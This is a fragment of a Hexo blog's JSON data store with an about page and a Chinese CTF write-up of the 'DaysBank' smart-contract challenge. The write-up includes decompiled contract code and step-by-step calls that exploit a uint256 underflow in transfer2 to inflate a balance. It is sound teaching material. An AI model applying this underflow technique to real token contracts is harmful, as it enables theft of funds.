6822417cc4e703312c14e20280ec783b3","modified":1584274123463},{"_id":"public/intro/post-bg.jpg","hash":"525fafb2238c27754d8fa751f143ff1de9b8482d","modified":1584274123463},{"_id":"public/intro/index-bg.jpg","hash":"96b52e177b8bc53e64ec6ee1e10b2b6a4e13083b","modified":1584274123478},{"_id":"public/avatar/sissel_head.jpg","hash":"be873211dd0df42d1f6c364884108a2e5201a4c5","modified":1584274123478}],"Category":[],"Data":[],"Page":[{"layout":"404","title":"[404]","description":"May the Force be with you :&#41;","_content":"","source":"404.md","raw":"---\nlayout: 404\ntitle: \"[404]\"\ndescription: \"May the Force be with you :&#41;\"\n---\n","date":"2020-02-18T07:52:34.142Z","updated":"2020-02-18T07:52:34.142Z","path":"404.html","comments":1,"_id":"ck6rlh7t1000021vwaut6dg3y","content":"","site":{"data":{}},"excerpt":"","more":""},{"title":"关于Sissel","layout":"about","date":"2019-03-14T19:13:42.000Z","_content":"\n## 常用ID\n- Sissel\n- Sisssssel\n- 西塞尔吃不胖\n- boke1208\n\n> 长颈鹿的脖子为什么那么长？\n\n## 个人简介\n\n- CTFer@天枢Dubhe\n- BYRTeam\n- 原长亭科技区块链组成员\n\n---\n\n- Splatoon2爆肝级选手\n- 风暴英雄使我快乐\n- 李健老师的忠实粉丝\n\n会弹尤克里里会吹琴会挖漏洞会开发有梦想的全干工程师\n\n\n","source":"about/index.md","raw":"---\ntitle: 关于Sissel\nlayout: about\ndate: 2019-03-15 03:13:42\n---\n\n## 常用ID\n- Sissel\n- Sisssssel\n- 西塞尔吃不胖\n- boke1208\n\n> 长颈鹿的脖子为什么那么长？\n\n## 个人简介\n\n- CTFer@天枢Dubhe\n- BYRTeam\n- 原长亭科技区块链组成员\n\n---\n\n- Splatoon2爆肝级选手\n- 风暴英雄使我快乐\n- 李健老师的忠实粉丝\n\n会弹尤克里里会吹琴会挖漏洞会开发有梦想的全干工程师\n\n\n","updated":"2020-02-18T08:26:51.795Z","path":"about/index.html","_id":"ck6rlh7u7001p21vwge1tzkko","comments":1,"content":"<h2 id=\"常用ID\"><a href=\"#常用ID\" class=\"headerlink\" title=\"常用ID\"></a>常用ID</h2><ul>\n<li>Sissel</li>\n<li>Sisssssel</li>\n<li>西塞尔吃不胖</li>\n<li>boke1208</li>\n</ul>\n<blockquote>\n<p>长颈鹿的脖子为什么那么长？</p>\n</blockquote>\n<h2 id=\"个人简介\"><a href=\"#个人简介\" class=\"headerlink\" title=\"个人简介\"></a>个人简介</h2><ul>\n<li>CTFer@天枢Dubhe</li>\n<li>BYRTeam</li>\n<li>原长亭科技区块链组成员</li>\n</ul>\n<hr>\n<ul>\n<li>Splatoon2爆肝级选手</li>\n<li>风暴英雄使我快乐</li>\n<li>李健老师的忠实粉丝</li>\n</ul>\n<p>会弹尤克里里会吹琴会挖漏洞会开发有梦想的全干工程师</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"常用ID\"><a href=\"#常用ID\" class=\"headerlink\" title=\"常用ID\"></a>常用ID</h2><ul>\n<li>Sissel</li>\n<li>Sisssssel</li>\n<li>西塞尔吃不胖</li>\n<li>boke1208</li>\n</ul>\n<blockquote>\n<p>长颈鹿的脖子为什么那么长？</p>\n</blockquote>\n<h2 id=\"个人简介\"><a href=\"#个人简介\" class=\"headerlink\" title=\"个人简介\"></a>个人简介</h2><ul>\n<li>CTFer@天枢Dubhe</li>\n<li>BYRTeam</li>\n<li>原长亭科技区块链组成员</li>\n</ul>\n<hr>\n<ul>\n<li>Splatoon2爆肝级选手</li>\n<li>风暴英雄使我快乐</li>\n<li>李健老师的忠实粉丝</li>\n</ul>\n<p>会弹尤克里里会吹琴会挖漏洞会开发有梦想的全干工程师</p>\n"}],"Post":[{"title":"【writeup】DaysBank","date":"2019-04-21T17:58:33.000Z","_content":"\n国赛第二天的区块链题目，因为很多人想要wp，就写了一份完整些的。\n\n<!-- more -->\n\n## Author\n天枢Dubhe Sissel\n\n## Init\n看最后发flag的邮箱是FlappyPig的大师傅出的题，厉害了。前两天参加别的比赛的时候，也逆了个合约，正好国赛用上了，可喜可贺。都是以前首席教我教的好，逃。\n\n## 题目\nRopsten, 0x455541c3e9179a6cd8c418142855d894e11a288c\n\n又给了变量名和`payforflag`的函数【太棒了，不然逆这个我可看不懂】\n```javascript=\ncontract DaysBank {\n    mapping(address => uint) public balanceOf;\n    mapping(address => uint) public gift;\n    address owner;\n        \n    constructor()public{\n        owner = msg.sender;\n    }\n    \n    event SendFlag(uint256 flagnum, string b64email);\n    function payforflag(string b64email) public {\n        require(balanceOf[msg.sender] >= 10000);\n        emit SendFlag(1,b64email);\n    }\n```\n\n## 解题过程\n\n首先访问ropsten这个合约的地址，发现没有个源代码，遂要对合约逆向。这个工具超好用：https://ethervm.io/decompile 。可以逆出来很好看的伪代码。我不怎么会re，所以下面的一些注释都是个人理解，有不对的地方望大佬们指正。\n\n### 逆向结果和注释\n```javascript\nPublic Methods\nMethod names cached from 4byte.directory.\n0x652e9d91 Unknown\n0x66d16cc3 profit()\n0x6bc344bc Unknown\n0x70a08231 balanceOf(address)\n0x7ce7c990 transfer2(address,uint256)\n0xa9059cbb transfer(address,uint256)\n0xcbfc4bce Unknown\n```\n上面有三个Unknown，分别是以下三个。\n\n- Init第一次薅羊毛\n- giftOf 得到用户的gift的值\n- sendFlag，得到flag的函数\n\n理解这些，会更好的看懂下面的代码\n\n> 00-20 放地址，20-40放0x01的时候，用storage访问，求的是gift的值\n> 即 storage[keccak256(memory[0x00:0x40])] = storage[keccak256( 地址+0x01 )] 是gift[address]\n> 00-20 放地址，20-40放0x00的时候，用storage访问，求的是balance的值\n> 即 storage[keccak256(memory[0x00:0x40])] = storage[keccak256( 地址+0x00 )] 是balance[address]\n\n```javascript\ncontract Contract {\n    function main() {\n        // 没用上\n        memory[0x40:0x60] = 0x80;\n        \n        // 根据tx的data字段，判断执行什么函数\n        if (msg.data.length < 0x04) { revert(memory[0x00:0x00]); }\n    \n        var var0 = msg.data[0x00:0x20] / 0x0100000000000000000000000000000000000000000000000000000000 & 0xffffffff;\n    \n        if (var0 == 0x652e9d91) {\n            // Dispatch table entry for 0x652e9d91 (unknown)\n            // 薅羊毛，类似于 Init()，让新用户的balanceOf和gift都变为1\n            var var1 = msg.value;\n        \n            if (var1) { revert(memory[0x00:0x00]); }\n        \n            var1 = 0x009c;\n            func_01DC();\n            stop();\n        } else if (var0 == 0x66d16cc3) {\n            // Dispatch table entry for profit()\n            // profit() 薅羊毛第二步，让balanceOf为1和gift为1的账户，都变为2.\n            var1 = msg.value;\n        \n            // 非payable\n            if (var1) { revert(memory[0x00:0x00]); }\n        \n            var1 = 0x009c;\n            profit();\n            stop();\n        } else if (var0 == 0x6bc344bc) {\n            // Dispatch table entry for 0x6bc344bc (unknown)\n            // payforflag() 最后获得flag的函数，不用逆\n            var1 = msg.value;\n        \n            if (var1) { revert(memory[0x00:0x00]); }\n        \n            var temp0 = memory[0x40:0x60];\n            var temp1 = msg.data[0x04:0x24];\n            var temp2 = msg.data[temp1 + 0x04:temp1 + 0x04 + 0x20];\n            memory[0x40:0x60] = temp0 + (temp2 + 0x1f) / 0x20 * 0x20 + 0x20;\n            memory[temp0:temp0 + 0x20] = temp2;\n            var1 = 0x009c;\n            memory[temp0 + 0x20:temp0 + 0x20 + temp2] = msg.data[temp1 + 0x24:temp1 + 0x24 + temp2];\n            var var2 = temp0;\n            func_0278(var2);\n            stop();\n        } else if (var0 == 0x70a08231) {\n            // Dispatch table entry for balanceOf(address)\n            // balanceOf() 获得用户余额\n            var1 = msg.value;\n        \n            if (var1) { revert(memory[0x00:0x00]); }\n        \n            var1 = 0x013a;\n            var2 = msg.data[0x04:0x24] & 0xffffffffffffffffffffffffffffffffffffffff;\n            var2 = balanceOf(var2);\n        \n        label_013A:\n            var temp3 = memory[0x40:0x60];\n            memory[temp3:temp3 + 0x20] = var2;\n            var temp4 = memory[0x40:0x60];\n            return memory[temp4:temp4 + temp3 - temp4 + 0x20];\n        } else if (var0 == 0x7ce7c990) {\n            // Dispatch table entry for transfer2(address,uint256)\n            // transfer2() 要求用户的balance大于等于3时可以用的转账，有整数溢出漏洞\n            var1 = msg.value;\n        \n            if (var1) { revert(memory[0x00:0x00]); }\n        \n            var1 = 0x009c;\n            var2 = msg.data[0x04:0x24] & 0xffffffffffffffffffffffffffffffffffffffff;\n            var var3 = msg.data[0x24:0x44];\n            transfer2(var2, var3);\n            stop();\n        } else if (var0 == 0xa9059cbb) {\n            // Dispatch table entry for transfer(address,uint256)\n            // transfer() 没有漏洞的transfer() 但要求balance大于2\n            var1 = msg.value;\n        \n            if (var1) { revert(memory[0x00:0x00]); }\n        \n            var1 = 0x009c;\n            var2 = msg.data[0x04:0x24] & 0xffffffffffffffffffffffffffffffffffffffff;\n            var3 = msg.data[0x24:0x44];\n            transfer(var2, var3);\n            stop();\n        } else if (var0 == 0xcbfc4bce) {\n            // Dispatch table entry for 0xcbfc4bce (unknown)\n            // 好像是返回用户的 gift值 就是map publice gift。这个变量\n            var1 = msg.value;\n        \n            if (var1) { revert(memory[0x00:0x00]); }\n        \n            var1 = 0x013a;\n            var2 = msg.data[0x04:0x24] & 0xffffffffffffffffffffffffffffffffffffffff;\n            var2 = func_0417(var2);\n            goto label_013A;\n        } else { revert(memory[0x00:0x00]); }\n    }\n    \n    // init\n    function func_01DC() {\n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x01;\n        \n        // gift要为0，指新用户\n        if (storage[keccak256(memory[0x00:0x40])]) { revert(memory[0x00:0x00]); }\n    \n        // gift和balance都变为1，薅第一次羊毛\n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        var temp0 = keccak256(memory[0x00:0x40]);\n        storage[temp0] = storage[temp0] + 0x01;\n        memory[0x20:0x40] = 0x01;\n        storage[keccak256(memory[0x00:0x40])] = 0x01;\n    }\n    \n    function profit() {\n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        \n        //balanceOf 必须是1\n        if (storage[keccak256(memory[0x00:0x40])] != 0x01) { revert(memory[0x00:0x00]); }\n    \n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x01;\n        // gift 必须是1\n        if (storage[keccak256(memory[0x00:0x40])] != 0x01) { revert(memory[0x00:0x00]); }\n    \n        // 都加1\n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        var temp0 = keccak256(memory[0x00:0x40]);\n        storage[temp0] = storage[temp0] + 0x01;\n        memory[0x20:0x40] = 0x01;\n        storage[keccak256(memory[0x00:0x40])] = 0x02;\n    }\n    \n    // getFlag，太长了不看，反正给了源码\n    function func_0278(var arg0) {\n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n    \n        if (0x2710 > storage[keccak256(memory[0x00:0x40])]) { revert(memory[0x00:0x00]); }\n    \n        var var0 = 0xb1bc9a9c599feac73a94c3ba415fa0b75cbe44496bfda818a9b4a689efb7adba;\n        var var1 = 0x01;\n        var temp0 = arg0;\n        var var2 = temp0;\n        var temp1 = memory[0x40:0x60];\n        var var3 = temp1;\n        memory[var3:var3 + 0x20] = var1;\n        var temp2 = var3 + 0x20;\n        var var4 = temp2;\n        var temp3 = var4 + 0x20;\n        memory[var4:var4 + 0x20] = temp3 - var3;\n        memory[temp3:temp3 + 0x20] = memory[var2:var2 + 0x20];\n        var var5 = temp3 + 0x20;\n        var var7 = memory[var2:var2 + 0x20];\n        var var6 = var2 + 0x20;\n        var var8 = var7;\n        var var9 = var5;\n        var var10 = var6;\n        var var11 = 0x00;\n    \n        if (var11 >= var8) {\n        label_02FD:\n            var temp4 = var7;\n            var5 = temp4 + var5;\n            var6 = temp4 & 0x1f;\n        \n            if (!var6) {\n                var temp5 = memory[0x40:0x60];\n                log(memory[temp5:temp5 + var5 - temp5], [stack[-7]]);\n                return;\n            } else {\n                var temp6 = var6;\n                var temp7 = var5 - temp6;\n                memory[temp7:temp7 + 0x20] = ~(0x0100 ** (0x20 - temp6) - 0x01) & memory[temp7:temp7 + 0x20];\n                var temp8 = memory[0x40:0x60];\n                log(memory[temp8:temp8 + (temp7 + 0x20) - temp8], [stack[-7]]);\n                return;\n            }\n        } else {\n        label_02EE:\n            var temp9 = var11;\n            memory[temp9 + var9:temp9 + var9 + 0x20] = memory[temp9 + var10:temp9 + var10 + 0x20];\n            var11 = temp9 + 0x20;\n        \n            if (var11 >= var8) { goto label_02FD; }\n            else { goto label_02EE; }\n        }\n    }\n    \n    function balanceOf(var arg0) returns (var arg0) {\n        memory[0x20:0x40] = 0x00;\n        memory[0x00:0x20] = arg0;\n        return storage[keccak256(memory[0x00:0x40])];\n    }\n    \n    function transfer2(var arg0, var arg1) {\n        // 转的钱要大于等于3\n        if (arg1 <= 0x02) { revert(memory[0x00:0x00]); }\n    \n        // balanceOf\n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        // balanceOf 要大于等于3\n        if (0x02 >= storage[keccak256(memory[0x00:0x40])]) { revert(memory[0x00:0x00]); }\n    \n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        \n        // require(balanceOf[address] - data > 0)\n        // _sissel_ 整数溢出 uint256\n        if (storage[keccak256(memory[0x00:0x40])] - arg1 <= 0x00) { revert(memory[0x00:0x00]); }\n    \n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        var temp0 = keccak256(memory[0x00:0x40]);\n        var temp1 = arg1;\n        // 自己的账户 - temp1\n        storage[temp0] = storage[temp0] - temp1;\n        memory[0x00:0x20] = arg0 & 0xffffffffffffffffffffffffffffffffffffffff;\n        // 别人的账户 + temp1\n        var temp2 = keccak256(memory[0x00:0x40]);\n        storage[temp2] = temp1 + storage[temp2];\n    }\n    \n    function transfer(var arg0, var arg1) {\n        // 转的钱要大于等于2，profit()后的状态正好满足\n        if (arg1 <= 0x01) { revert(memory[0x00:0x00]); }\n    \n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        // balanceOf 要大于等于2\n        if (0x01 >= storage[keccak256(memory[0x00:0x40])]) { revert(memory[0x00:0x00]); }\n\n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        \n        // 贼安全，哈哈\n        // require(balanceof[address]>=arg1)\n        if (arg1 > storage[keccak256(memory[0x00:0x40])]) { revert(memory[0x00:0x00]); }\n    \n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        var temp0 = keccak256(memory[0x00:0x40]);\n        var temp1 = arg1;\n        storage[temp0] = storage[temp0] - temp1;\n        memory[0x00:0x20] = arg0 & 0xffffffffffffffffffffffffffffffffffffffff;\n        var temp2 = keccak256(memory[0x00:0x40]);\n        storage[temp2] = temp1 + storage[temp2];\n    }\n    \n    function func_0417(var arg0) returns (var arg0) {\n        memory[0x20:0x40] = 0x01;\n        memory[0x00:0x20] = arg0;\n        return storage[keccak256(memory[0x00:0x40])];\n    }\n}\n```\n\n因为合约比较简单，大家去找几个bank合约对照一下就看懂了。先多看智能合约，再来看逆向，会简单很多。\n\n### 攻击过程\n\n- 我们最终需要balance很大，那就需要用transfer2构造一个整数溢出。\n- transfer2需要账户余额大于等于3。\n- init可以让账户变为1，profit可以让账户由1变2。\n- transfer 没有溢出，但只需要balance大于等于2就可以用。\n\n1. 账号1 init() 注意：这个函数的名字不知道，要用四字节码调用。\n2. 账号1 profit()\n3. 账号2 init() 注意：同1\n4. 账号2 profit()\n5. 账号1 transfer(账户2,2)\n6. 账号2 transfer2(账户3, 2\\*\\*256-1) 给账户3，此函数有下溢\n7. 目标账户 getflag()\n\n以四字节码调用合约，可以用python发包，或者写攻击合约代发，或者找一些钱包，支持修改data字段的都行。看攻击过程的话，可以看f61d的师傅的，是event里第四个地址【前三个是我。。当时收不到邮件，试了好半天，我当时是用攻击合约写的，不太清晰】。\n\n\n\n\n\n\n","source":"_posts/DaysBank.md","raw":"---\ntitle: 【writeup】DaysBank\ndate: 2019-04-22 01:58:33\ntags:\n- 区块链\n- CTF\n- writeup\n---\n\n国赛第二天的区块链题目，因为很多人想要wp，就写了一份完整些的。\n\n<!-- more -->\n\n## Author\n天枢Dubhe Sissel\n\n## Init\n看最后发flag的邮箱是FlappyPig的大师傅出的题，厉害了。前两天参加别的比赛的时候，也逆了个合约，正好国赛用上了，可喜可贺。都是以前首席教我教的好，逃。\n\n## 题目\nRopsten, 0x455541c3e9179a6cd8c418142855d894e11a288c\n\n又给了变量名和`payforflag`的函数【太棒了，不然逆这个我可看不懂】\n```javascript=\ncontract DaysBank {\n    mapping(address => uint) public balanceOf;\n    mapping(address => uint) public gift;\n    address owner;\n        \n    constructor()public{\n        owner = msg.sender;\n    }\n    \n    event SendFlag(uint256 flagnum, string b64email);\n    function payforflag(string b64email) public {\n        require(balanceOf[msg.sender] >= 10000);\n        emit SendFlag(1,b64email);\n    }\n```\n\n## 解题过程\n\n首先访问ropsten这个合约的地址，发现没有个源代码，遂要对合约逆向。这个工具超好用：https://ethervm.io/decompile 。可以逆出来很好看的伪代码。我不怎么会re，所以下面的一些注释都是个人理解，有不对的地方望大佬们指正。\n\n### 逆向结果和注释\n```javascript\nPublic Methods\nMethod names cached from 4byte.directory.\n0x652e9d91 Unknown\n0x66d16cc3 profit()\n0x6bc344bc Unknown\n0x70a08231 balanceOf(address)\n0x7ce7c990 transfer2(address,uint256)\n0xa9059cbb transfer(address,uint256)\n0xcbfc4bce Unknown\n```\n上面有三个Unknown，分别是以下三个。\n\n- Init第一次薅羊毛\n- giftOf 得到用户的gift的值\n- sendFlag，得到flag的函数\n\n理解这些，会更好的看懂下面的代码\n\n> 00-20 放地址，20-40放0x01的时候，用storage访问，求的是gift的值\n> 即 storage[keccak256(memory[0x00:0x40])] = storage[keccak256( 地址+0x01 )] 是gift[address]\n> 00-20 放地址，20-40放0x00的时候，用storage访问，求的是balance的值\n> 即 storage[keccak256(memory[0x00:0x40])] = storage[keccak256( 地址+0x00 )] 是balance[address]\n\n```javascript\ncontract Contract {\n    function main() {\n        // 没用上\n        memory[0x40:0x60] = 0x80;\n        \n        // 根据tx的data字段，判断执行什么函数\n        if (msg.data.length < 0x04) { revert(memory[0x00:0x00]); }\n    \n        var var0 = msg.data[0x00:0x20] / 0x0100000000000000000000000000000000000000000000000000000000 & 0xffffffff;\n    \n        if (var0 == 0x652e9d91) {\n            // Dispatch table entry for 0x652e9d91 (unknown)\n            // 薅羊毛，类似于 Init()，让新用户的balanceOf和gift都变为1\n            var var1 = msg.value;\n        \n            if (var1) { revert(memory[0x00:0x00]); }\n        \n            var1 = 0x009c;\n            func_01DC();\n            stop();\n        } else if (var0 == 0x66d16cc3) {\n            // Dispatch table entry for profit()\n            // profit() 薅羊毛第二步，让balanceOf为1和gift为1的账户，都变为2.\n            var1 = msg.value;\n        \n            // 非payable\n            if (var1) { revert(memory[0x00:0x00]); }\n        \n            var1 = 0x009c;\n            profit();\n            stop();\n        } else if (var0 == 0x6bc344bc) {\n            // Dispatch table entry for 0x6bc344bc (unknown)\n            // payforflag() 最后获得flag的函数，不用逆\n            var1 = msg.value;\n        \n            if (var1) { revert(memory[0x00:0x00]); }\n        \n            var temp0 = memory[0x40:0x60];\n            var temp1 = msg.data[0x04:0x24];\n            var temp2 = msg.data[temp1 + 0x04:temp1 + 0x04 + 0x20];\n            memory[0x40:0x60] = temp0 + (temp2 + 0x1f) / 0x20 * 0x20 + 0x20;\n            memory[temp0:temp0 + 0x20] = temp2;\n            var1 = 0x009c;\n            memory[temp0 + 0x20:temp0 + 0x20 + temp2] = msg.data[temp1 + 0x24:temp1 + 0x24 + temp2];\n            var var2 = temp0;\n            func_0278(var2);\n            stop();\n        } else if (var0 == 0x70a08231) {\n            // Dispatch table entry for balanceOf(address)\n            // balanceOf() 获得用户余额\n            var1 = msg.value;\n        \n            if (var1) { revert(memory[0x00:0x00]); }\n        \n            var1 = 0x013a;\n            var2 = msg.data[0x04:0x24] & 0xffffffffffffffffffffffffffffffffffffffff;\n            var2 = balanceOf(var2);\n        \n        label_013A:\n            var temp3 = memory[0x40:0x60];\n            memory[temp3:temp3 + 0x20] = var2;\n            var temp4 = memory[0x40:0x60];\n            return memory[temp4:temp4 + temp3 - temp4 + 0x20];\n        } else if (var0 == 0x7ce7c990) {\n            // Dispatch table entry for transfer2(address,uint256)\n            // transfer2() 要求用户的balance大于等于3时可以用的转账，有整数溢出漏洞\n            var1 = msg.value;\n        \n            if (var1) { revert(memory[0x00:0x00]); }\n        \n            var1 = 0x009c;\n            var2 = msg.data[0x04:0x24] & 0xffffffffffffffffffffffffffffffffffffffff;\n            var var3 = msg.data[0x24:0x44];\n            transfer2(var2, var3);\n            stop();\n        } else if (var0 == 0xa9059cbb) {\n            // Dispatch table entry for transfer(address,uint256)\n            // transfer() 没有漏洞的transfer() 但要求balance大于2\n            var1 = msg.value;\n        \n            if (var1) { revert(memory[0x00:0x00]); }\n        \n            var1 = 0x009c;\n            var2 = msg.data[0x04:0x24] & 0xffffffffffffffffffffffffffffffffffffffff;\n            var3 = msg.data[0x24:0x44];\n            transfer(var2, var3);\n            stop();\n        } else if (var0 == 0xcbfc4bce) {\n            // Dispatch table entry for 0xcbfc4bce (unknown)\n            // 好像是返回用户的 gift值 就是map publice gift。这个变量\n            var1 = msg.value;\n        \n            if (var1) { revert(memory[0x00:0x00]); }\n        \n            var1 = 0x013a;\n            var2 = msg.data[0x04:0x24] & 0xffffffffffffffffffffffffffffffffffffffff;\n            var2 = func_0417(var2);\n            goto label_013A;\n        } else { revert(memory[0x00:0x00]); }\n    }\n    \n    // init\n    function func_01DC() {\n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x01;\n        \n        // gift要为0，指新用户\n        if (storage[keccak256(memory[0x00:0x40])]) { revert(memory[0x00:0x00]); }\n    \n        // gift和balance都变为1，薅第一次羊毛\n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        var temp0 = keccak256(memory[0x00:0x40]);\n        storage[temp0] = storage[temp0] + 0x01;\n        memory[0x20:0x40] = 0x01;\n        storage[keccak256(memory[0x00:0x40])] = 0x01;\n    }\n    \n    function profit() {\n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        \n        //balanceOf 必须是1\n        if (storage[keccak256(memory[0x00:0x40])] != 0x01) { revert(memory[0x00:0x00]); }\n    \n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x01;\n        // gift 必须是1\n        if (storage[keccak256(memory[0x00:0x40])] != 0x01) { revert(memory[0x00:0x00]); }\n    \n        // 都加1\n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        var temp0 = keccak256(memory[0x00:0x40]);\n        storage[temp0] = storage[temp0] + 0x01;\n        memory[0x20:0x40] = 0x01;\n        storage[keccak256(memory[0x00:0x40])] = 0x02;\n    }\n    \n    // getFlag，太长了不看，反正给了源码\n    function func_0278(var arg0) {\n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n    \n        if (0x2710 > storage[keccak256(memory[0x00:0x40])]) { revert(memory[0x00:0x00]); }\n    \n        var var0 = 0xb1bc9a9c599feac73a94c3ba415fa0b75cbe44496bfda818a9b4a689efb7adba;\n        var var1 = 0x01;\n        var temp0 = arg0;\n        var var2 = temp0;\n        var temp1 = memory[0x40:0x60];\n        var var3 = temp1;\n        memory[var3:var3 + 0x20] = var1;\n        var temp2 = var3 + 0x20;\n        var var4 = temp2;\n        var temp3 = var4 + 0x20;\n        memory[var4:var4 + 0x20] = temp3 - var3;\n        memory[temp3:temp3 + 0x20] = memory[var2:var2 + 0x20];\n        var var5 = temp3 + 0x20;\n        var var7 = memory[var2:var2 + 0x20];\n        var var6 = var2 + 0x20;\n        var var8 = var7;\n        var var9 = var5;\n        var var10 = var6;\n        var var11 = 0x00;\n    \n        if (var11 >= var8) {\n        label_02FD:\n            var temp4 = var7;\n            var5 = temp4 + var5;\n            var6 = temp4 & 0x1f;\n        \n            if (!var6) {\n                var temp5 = memory[0x40:0x60];\n                log(memory[temp5:temp5 + var5 - temp5], [stack[-7]]);\n                return;\n            } else {\n                var temp6 = var6;\n                var temp7 = var5 - temp6;\n                memory[temp7:temp7 + 0x20] = ~(0x0100 ** (0x20 - temp6) - 0x01) & memory[temp7:temp7 + 0x20];\n                var temp8 = memory[0x40:0x60];\n                log(memory[temp8:temp8 + (temp7 + 0x20) - temp8], [stack[-7]]);\n                return;\n            }\n        } else {\n        label_02EE:\n            var temp9 = var11;\n            memory[temp9 + var9:temp9 + var9 + 0x20] = memory[temp9 + var10:temp9 + var10 + 0x20];\n            var11 = temp9 + 0x20;\n        \n            if (var11 >= var8) { goto label_02FD; }\n            else { goto label_02EE; }\n        }\n    }\n    \n    function balanceOf(var arg0) returns (var arg0) {\n        memory[0x20:0x40] = 0x00;\n        memory[0x00:0x20] = arg0;\n        return storage[keccak256(memory[0x00:0x40])];\n    }\n    \n    function transfer2(var arg0, var arg1) {\n        // 转的钱要大于等于3\n        if (arg1 <= 0x02) { revert(memory[0x00:0x00]); }\n    \n        // balanceOf\n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        // balanceOf 要大于等于3\n        if (0x02 >= storage[keccak256(memory[0x00:0x40])]) { revert(memory[0x00:0x00]); }\n    \n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        \n        // require(balanceOf[address] - data > 0)\n        // _sissel_ 整数溢出 uint256\n        if (storage[keccak256(memory[0x00:0x40])] - arg1 <= 0x00) { revert(memory[0x00:0x00]); }\n    \n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        var temp0 = keccak256(memory[0x00:0x40]);\n        var temp1 = arg1;\n        // 自己的账户 - temp1\n        storage[temp0] = storage[temp0] - temp1;\n        memory[0x00:0x20] = arg0 & 0xffffffffffffffffffffffffffffffffffffffff;\n        // 别人的账户 + temp1\n        var temp2 = keccak256(memory[0x00:0x40]);\n        storage[temp2] = temp1 + storage[temp2];\n    }\n    \n    function transfer(var arg0, var arg1) {\n        // 转的钱要大于等于2，profit()后的状态正好满足\n        if (arg1 <= 0x01) { revert(memory[0x00:0x00]); }\n    \n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        // balanceOf 要大于等于2\n        if (0x01 >= storage[keccak256(memory[0x00:0x40])]) { revert(memory[0x00:0x00]); }\n\n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        \n        // 贼安全，哈哈\n        // require(balanceof[address]>=arg1)\n        if (arg1 > storage[keccak256(memory[0x00:0x40])]) { revert(memory[0x00:0x00]); }\n    \n        memory[0x00:0x20] = msg.sender;\n        memory[0x20:0x40] = 0x00;\n        var temp0 = keccak256(memory[0x00:0x40]);\n        var temp1 = arg1;\n        storage[temp0] = storage[temp0] - temp1;\n        memory[0x00:0x20] = arg0 & 0xffffffffffffffffffffffffffffffffffffffff;\n        var temp2 = keccak256(memory[0x00:0x40]);\n        storage[temp2] = temp1 + storage[temp2];\n    }\n    \n    function func_0417(var arg0) returns (var arg0) {\n        memory[0x20:0x40] = 0x01;\n        memory[0x00:0x20] = arg0;\n        return storage[keccak256(memory[0x00:0x40])];\n    }\n}\n```\n\n因为合约比较简单，大家去找几个bank合约对照一下就看懂了。先多看智能合约，再来看逆向，会简单很多。\n\n### 攻击过程\n\n- 我们最终需要balance很大，那就需要用transfer2构造一个整数溢出。\n- transfer2需要账户余额大于等于3。\n- init可以让账户变为1，profit可以让账户由1变2。\n- transfer 没有溢出，但只需要balance大于等于2就可以用。\n\n1. 账号1 init() 注意：这个函数的名字不知道，要用四字节码调用。\n2. 账号1 profit()\n3. 账号2 init() 注意：同1\n4. 账号2 profit()\n5. 账号1 transfer(账户2,2)\n6. 账号2 transfer2(账户3, 2\\*\\*256-1) 给账户3，此函数有下溢\n7. 目标账户 getflag()\n\n以四字节码调用合约，可以用python发包，或者写攻击合约代发，或者找一些钱包，支持修改data字段的都行。看攻击过程的话，可以看f61d的师傅的，是event里第四个地址【前三个是我。。当时收不到邮件，试了好半天，我当时是用攻击合约写的，不太清晰】。\n\n\n\n\n\n\n","slug":"DaysBank","published":1,"updated":"2020-02-19T07:29:28.355Z","_id":"ck6rlh7t7000121vww89w9l3v","comments":1,"layout":"post","photos":[],"link":"","content":"<p>国赛第二天的区块链题目，因为很多人想要wp，就写了一份完整些的。</p>\n<a id=\"more\"></a>\n<h2 id=\"Author\"><a href=\"#Author\" class=\"headerlink\" title=\"Author\"></a>Author</h2><p>天枢Dubhe Sissel</p>\n<h2 id=\"Init\"><a href=\"#Init\" class=\"headerlink\" title=\"Init\"></a>Init</h2><p>看最后发flag的邮箱是FlappyPig的大师傅出的题，厉害了。前两天参加别的比赛的时候，也逆了个合约，正好国赛用上了，可喜可贺。都是以前首席教我教的好，逃。</p>\n<h2 id=\"题目\"><a href=\"#题目\" class=\"headerlink\" title=\"题目\"></a>题目</h2><p>Ropsten, 0x455541c3e9179a6cd8c418142855d894e11a288c</p>\n<p>又给了变量名和<code>payforflag</code>的函数【太棒了，不然逆这个我可看不懂】<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span 